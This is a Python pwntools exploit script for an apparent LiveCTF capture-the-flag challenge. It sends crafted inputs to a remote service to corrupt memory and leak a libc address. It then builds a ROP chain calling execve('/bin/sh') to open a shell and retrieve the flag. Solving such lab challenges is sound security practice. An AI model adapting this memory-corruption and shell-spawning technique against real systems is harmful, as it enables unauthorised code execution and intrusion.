#!/usr/bin/env python3

from pwn import *

exe = ELF("./challenge_patched")
libc = ELF("./libc.so.6")

context.binary = exe

#io = gdb.debug([exe.path], '''
#''')

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
io = remote(HOST, int(PORT))


io.sendlineafter(b'?', b'10')
io.sendlineafter(b'?', b'7')

n = 0x40
x = p8(0x0) * 9
x += p8(0x10)

io.sendafter(b'?', x)
io.sendafter(b'?', x.ljust(0x10, p8(0)))
io.sendafter(b'?', x.ljust(0x10, p8(0)))
io.sendafter(b'?', x.ljust(0x10, p8(0)))

x = p8(0x0) * 9
x += p8(0x7f)

io.sendafter(b'?', x.ljust(0x10, p8(0)))
# m: -0x14
# c: 

x = flat({
    0: p8(0) * 9 + p8(0xff),
    0x48: p32(0x100),
    0x7f: b'',
})

io.sendafter(b'?', x)

leak = io.recvuntil('What is ')
leak = leak.replace(b'\x1B[0m', b'')
leak = leak.replace(b'\x1B[1;30;43m', b'')
leak = leak.replace(b'\x1B[1;30;42m', b'')
leak = leak.replace(b' ', b'')

leak = u64(leak[0xb4 : 0xb4 + 8])
print(hexdump(leak))
log.info(f'leak: {leak:#x}')

libc.address = leak - 0x29d90

binsh = next(libc.search(b"/bin/sh"))
rop = ROP(libc)
rop.execve(binsh, 0, 0)

k = 0x68 - 4 - 8
x = flat({
    0x25: rop.chain(),
    0xff:b'',
}, filler=b'A')
#x = b'A'*0x100
io.sendafter(b'?', x)

io.sendline("")
io.sendline("")

io.sendline('./submitter')
flag = io.recvline_contains(b'LiveCTF{').decode().strip()
print(f'Flag: {flag}')
